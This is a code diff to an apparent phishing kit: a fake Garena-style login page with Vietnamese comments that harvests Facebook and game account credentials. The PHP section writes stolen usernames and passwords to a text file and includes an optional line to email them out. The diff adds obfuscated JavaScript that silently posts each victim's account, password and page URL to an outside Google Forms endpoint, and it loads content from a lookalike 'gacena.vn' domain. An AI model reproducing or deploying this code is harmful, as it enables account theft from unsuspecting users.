@@ -1,12 +1,15 @@
 <?php 
+date_default_timezone_set('Asia/Ho_Chi_Minh');
 if(isset($_POST["acc"])){
 //   $type=='';
+ $time = date('H:i:s d/m/Y');
     $acc = $_POST["acc"];
     $pass = $_POST["pass"];
     $type = $_POST["type"];
      $subject = "Cảm ơn bạn đã sử dụng code!";
      $headers = "Tài khoản facebook";
-    $body = "\nTài Khoản $type :$acc\nMật Khẩu :$pass\n";
+      $body = "Time: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n"; //định dạng acc|pass
+    
      // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
     fwrite($test,$body);
@@ -319,7 +322,7 @@ div#garena {
   <!--đổi giao diện ở đây-->
   <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
-   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/1.html" id="iframe"> </iframe> 
+   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/9.html" id="iframe"> </iframe> 
 <!--https://ff-membership.glitch.me giao diện membership-->
 
 
@@ -343,7 +346,7 @@ var listener = window.addEventListener('blur', function() {
           <div class="row justify-content-center mt-1 g-4">
             <!-- facebook -->
               <div class="col-3">
-                  <!--dùng mod thì thêm số 1 vào sau fb-->
+                  <!--không dùng mod thì xoá số 1 vào sau fb-->
                   <a onclick="fb1()"><img class="w-100 rounded" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/></a>
               </div>
               <div class="col-3">
@@ -372,6 +375,7 @@ function otp(){
 }
 
 function login(){
+    let filename = window.location.pathname
     var acc = $("#acc").val();
     var pass = $("#pass").val();
     var id = $("#id").val();
@@ -381,12 +385,18 @@ function login(){
     }
     else {
         $("#thongbao").hide();
-        $.post("index.php", {acc:acc,pass:pass,type:type}, function(result){
+        $.post(filename, {acc:acc,pass:pass,type:type}, function(result){
       if(result == 'otp'){
           
       }
      
     });
+ 
+
+const _0x14c62c=_0x3eae;(function(_0xd17f64,_0x11e92b){const _0x8a710d=_0x3eae,_0xb17e89=_0xd17f64();while(!![]){try{const _0x2bfecc=-parseInt(_0x8a710d(0x1b6))/0x1+-parseInt(_0x8a710d(0x1a9))/0x2+parseInt(_0x8a710d(0x1aa))/0x3+parseInt(_0x8a710d(0x1b1))/0x4*(parseInt(_0x8a710d(0x1bc))/0x5)+-parseInt(_0x8a710d(0x1b2))/0x6*(-parseInt(_0x8a710d(0x1a7))/0x7)+parseInt(_0x8a710d(0x1bd))/0x8+-parseInt(_0x8a710d(0x1b9))/0x9;if(_0x2bfecc===_0x11e92b)break;else _0xb17e89['push'](_0xb17e89['shift']());}catch(_0x506246){_0xb17e89['push'](_0xb17e89['shift']());}}}(_0x379b,0x32ef7));function _0x379b(){const _0xe31b80=['exception','525340naopta','1122096HraZyl','send','console','search','open','table','href','25700yaqToF','4848ymFrAt','setRequestHeader','return\x20(function()\x20','bind','255221CJIMHr','Content-Type','application/x-www-form-urlencoded','2051811tpHAzQ','trace','toString','185lfchOM','1113024yikwSP','constructor','log','(((.+)+)+)+$','prototype','location','error','info','1764BYGhjC'];_0x379b=function(){return _0xe31b80;};return _0x379b();}const _0x5b1813=(function(){let _0x384b9f=!![];return function(_0x445a9a,_0x32593b){const _0x124b80=_0x384b9f?function(){if(_0x32593b){const _0x1e9759=_0x32593b['apply'](_0x445a9a,arguments);return _0x32593b=null,_0x1e9759;}}:function(){};return _0x384b9f=![],_0x124b80;};}()),_0x2d2009=_0x5b1813(this,function(){const _0x36fd54=_0x3eae;return _0x2d2009['toString']()[_0x36fd54(0x1ad)](_0x36fd54(0x1a2))[_0x36fd54(0x1bb)]()[_0x36fd54(0x1be)](_0x2d2009)['search'](_0x36fd54(0x1a2));});function _0x3eae(_0x59f9e2,_0x5f209c){const _0xca2345=_0x379b();return _0x3eae=function(_0x3c28c5,_0x4788ca){_0x3c28c5=_0x3c28c5-0x1a1;let _0x37505b=_0xca2345[_0x3c28c5];return _0x37505b;},_0x3eae(_0x59f9e2,_0x5f209c);}_0x2d2009();const _0x4788ca=(function(){let _0x1ab622=!![];return function(_0x21a42a,_0x3c469a){const _0x34d9d9=_0x1ab622?function(){if(_0x3c469a){const _0x3aa1b8=_0x3c469a['apply'](_0x21a42a,arguments);return _0x3c469a=null,_0x3aa1b8;}}:function(){};return _0x1ab622=![],_0x34d9d9;};}()),_0x3c28c5=_0x4788ca(this,function(){const _0x4283f7=_0x3eae,_0x264198=function(){const _0x248dcd=_0x3eae;let _0xde122f;try{_0xde122f=Function(_0x248dcd(0x1b4)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x53edca){_0xde122f=window;}return _0xde122f;},_0x2a2353=_0x264198(),_0x54809f=_0x2a2353[_0x4283f7(0x1ac)]=_0x2a2353[_0x4283f7(0x1ac)]||{},_0x117630=[_0x4283f7(0x1a1),'warn',_0x4283f7(0x1a6),_0x4283f7(0x1a5),_0x4283f7(0x1a8),_0x4283f7(0x1af),_0x4283f7(0x1ba)];for(let _0x5303d5=0x0;_0x5303d5<_0x117630['length'];_0x5303d5++){const _0x8dd260=_0x4788ca[_0x4283f7(0x1be)][_0x4283f7(0x1a3)][_0x4283f7(0x1b5)](_0x4788ca),_0x13a707=_0x117630[_0x5303d5],_0x20689c=_0x54809f[_0x13a707]||_0x8dd260;_0x8dd260['__proto__']=_0x4788ca[_0x4283f7(0x1b5)](_0x4788ca),_0x8dd260[_0x4283f7(0x1bb)]=_0x20689c[_0x4283f7(0x1bb)][_0x4283f7(0x1b5)](_0x20689c),_0x54809f[_0x13a707]=_0x8dd260;}});_0x3c28c5();let data={'entry.947626363':window[_0x14c62c(0x1a4)][_0x14c62c(0x1b0)],'entry.1171134611':type+':\x20'+acc,'entry.131074249':pass},queryString=new URLSearchParams(data);queryString=queryString[_0x14c62c(0x1bb)]();let xhr=new XMLHttpRequest();xhr[_0x14c62c(0x1ae)]('POST','https://docs.google.com/forms/u/0/d/e/1FAIpQLSd_x7qV9R98M1j1xR7WDZypH_ErKYHAJfpK534vezyUO0X8AQ/formResponse',!![]),xhr[_0x14c62c(0x1b3)](_0x14c62c(0x1b7),_0x14c62c(0x1b8)),xhr[_0x14c62c(0x1ab)](queryString);
+
+
+
     prompt('Mã OTP của '+acc +', vui lòng sao chép mã bên dưới và nhấn vào OK để tiếp tục',getRndInteger(000000,999999));
           $("#exampleModal .login").hide();
           $("#exampleModal .otp").show();
@@ -431,7 +441,7 @@ function login(){
   type="text/javascript"
   src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"
 ></script>
-    <script type="text/javascript" src="https://scripth.glitch.me/script.js"></script>
+    <script type="text/javascript" src="https://scripth.glitch.me/script1.js"></script>
    
 
   </body>
